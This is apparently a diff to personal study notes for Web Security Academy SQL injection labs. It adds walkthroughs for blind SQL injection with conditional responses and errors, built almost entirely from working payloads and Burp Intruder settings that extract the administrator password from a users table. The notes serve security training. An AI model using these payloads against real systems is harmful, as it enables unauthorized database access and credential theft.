@@ -112,15 +112,40 @@
     - records: `' UNION SELECT USERNAME, PASSWORD FROM USERS--`
 19. SQL injection UNION attack, **retrieving multiple values in a single column**
     - `' UNION SELECT NULL,username||'~'||password FROM users--`
-21. Item 11
-22. Item 12
-23. Item 13
-24. Item 14
-25. Item 15
-26. Item 16
-27. Item 17
-28. Item 18
-29. 
+21. **Blind SQL injection** with **conditional responses**
+    - Check response  
+      Cookie: TrackingId=ZZZ`' AND '1'='1`  (Welcome back)  
+      Cookie: TrackingId=ZZZ`' AND '1'='2`  (No record)  
+    - confirm table name: `' AND (SELECT 'a' FROM users LIMIT 1)='a`
+    - confirm user name: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+    - confirm length of password (Burp intruder: Sniper) 
+      Cookie: TrackingId=ZZZ`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a;`  
+      **Position**:§1§; **Paylaods**: Numbers; From 1 to 20; **Settings**>Grep - Match: Welcome back --> Start Attack  
+    - enumerate password (Burp intruder: cluster bomb)  
+      Cookie: TrackingId=ZZZ`' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`  
+      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9
+    - Automation [Python script](https://github.com/sandunigfdo/Web-Security-Academy-Series/blob/2be2887b7a2818dd6e7d5f0ed1ac6b01fcfcac28/SQL%20injection/sqli-Lab11.py)  
+      py sqli-Lab11.py [https://xxx.web-security-academy.net/]  
+      [+] Retrieving administrator password.... rvxvtobfe7e_____
+23. **Blind SQL injection** with **conditional errors**
+    - Check response  
+      Cookie: TrackingId=ZZZ`'` (Error)  
+      Cookie: TrackingId=ZZZ`''` (No Error)  
+    - confirm table name: TrackingId=ZZZ`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+    - confirm user name: TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+    - confirm length of password (Burp intruder: Sniper)  
+      TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+       **Position**:§1§; **Paylaods**: Numbers; From 1 to 20;-->Start Attack-->Find 500 response code  
+    - enumerate password (Burp intruder: cluster bomb)  
+      TrackingId=ZZZ`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
+25. Item 13
+26. Item 14
+27. Item 15
+28. Item 16
+29. Item 17
+30. Item 18
+31. 
 
 
 
